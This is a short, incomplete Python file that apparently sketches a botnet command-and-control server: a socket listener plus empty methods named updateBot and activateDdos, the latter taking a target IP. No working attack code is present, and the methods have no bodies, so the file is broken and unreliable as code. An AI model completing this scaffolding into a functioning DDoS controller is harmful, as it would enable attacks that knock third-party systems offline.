import os
import socket

class Server:
    
    def __init__(self):
        self.connections = [] 
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.address = ('localhost',10000)
        self.sock.listen(1000)  
    
    def updateBot(self,data):
        
            
    def activateDdos(self,ip):
        
    
    def getConnections(self):
        return self.connections;
             